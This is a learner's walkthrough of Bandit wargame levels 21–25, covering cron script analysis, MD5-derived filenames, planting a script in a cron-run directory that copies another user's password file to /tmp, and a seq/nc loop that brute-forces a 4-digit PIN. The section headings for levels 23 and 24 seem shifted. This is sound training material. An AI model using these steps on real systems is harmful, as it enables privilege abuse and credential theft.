## **🔸 Level 21 → Level 22**

**Objective**
Analyze and leverage a cronjob script that copies the password to a temporary location you can access.

**Commands Used**

```
cd
ls -l
cat
```

**Step-by-step**

1. `cd /etc/cron.d/`
   Located scheduled cron files that run periodically
2. `cat cronjob_bandit22`
   Found the script executed regularly for this level
3. `cat /usr/bin/cronjob_bandit22.sh`
   Inspected script to see password copy location
4. `cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`
   Retrieved password from the file produced by cron

***Result:*** Password successfully retrieved

---

## **🔸 Level 22 → Level 23**

**Objective**
Exploit a cron script that hashes the current username using MD5 before storing the password output in `/tmp`.

**Commands Used**

```
whoami
echo
md5sum
cat
```

**Step-by-step**

1. `whoami`
   Identified the current user (`bandit22`)
2. `echo I am user bandit23 | md5sum | cut -d ' ' -f1`
   Generated the MD5 hash used as filename by the cron script
3. `cat /tmp/<generated_hash>`
   Retrieved the password from the matching output file

***Result:*** Password successfully retrieved

---

## **🔸 Level 23 → Level 24**

**Objective**
Repeat the hashing process from the previous level to discover the file holding the next password.

**Commands Used**

```
echo
md5sum
cat
```

**Step-by-step**

1. `echo I am user bandit23 | md5sum | cut -d ' ' -f1`
   Repeated hash generation logic used by cronjob
2. `cat /tmp/<generated_hash>`
   Extracted password from the resulting file

***Result:*** Password successfully retrieved

> **Note:** This level reinforces hashing logic; same methodology, different target.

---

## **🔸 Level 24 → Level 25**

**Objective**
Exploit a cronjob that executes scripts placed inside a monitored directory to make it reveal the password for bandit24.

**Commands Used**

```
cd
nano
chmod +x
cat
```

**Step-by-step**

1. `cd /var/spool/bandit24/foo`
   Navigated to the directory where cron executes scripts as bandit24
2. Created exploit script:

   ```
   nano exploit.sh
   #!/bin/bash
   cat /etc/bandit_pass/bandit24 > /tmp/bandit23_pass.txt
   chown bandit23:bandit23 /tmp/bandit23_pass.txt
   ```
3. `chmod +x exploit.sh`
   Made script executable so cron would run it
4. After cron executed, retrieved password:
   `cat /tmp/bandit23_pass.txt`

***Result:*** Password successfully retrieved

---

## **🔸 Level 25 → Level 26**

**Objective**
Brute-force a 4-digit PIN required by a service to validate the previous password and return the next one.

**Commands Used**

```
seq
nc
echo
```

**Step-by-step**

1. Scripted password + PIN combinations:

   ```
   password="<password_from_level24>"
   for pin in $(seq -w 0000 9999); do
       echo "$password $pin"
   done | nc localhost 30002
   ```

   Iterated all numeric PINs while piping into the running service
2. Read service response to capture the password

***Result:*** Password successfully retrieved
### **Key learning**
**- Understanding automated task execution through cronjobs**
You learned how scheduled tasks can unintentionally expose sensitive data and how inspecting cron scripts reveals predictable behavior attackers can exploit.

**- Following data flow instead of guessing**
Instead of searching randomly, you traced where each cron script writes its output.
This sharpened your instinct to track paths, permissions, and outputs — central to system enumeration.

**- Deriving filenames programmatically**
By replicating the script logic (username → MD5 hash → filename), you matched system behavior to extract passwords.
This built confidence in thinking like the script rather than chasing files manually.

**- Injecting controlled code into trusted execution paths**
You placed your own script where a privileged cronjob executes it — a safe example of post-exploitation technique where attackers piggyback on trusted processes.

**- Privilege boundaries and safe escalation**
You manipulated output locations and file ownership to pull protected credentials into accessible locations — learning how small permission shifts enable targeted privilege access.

**- Automated credential brute-forcing using pipelines**
Level 25 reinforced how loops and data streams (seq, piping into nc) can automate repetitive tasks, introducing the mindset of scripting over manual attempts.
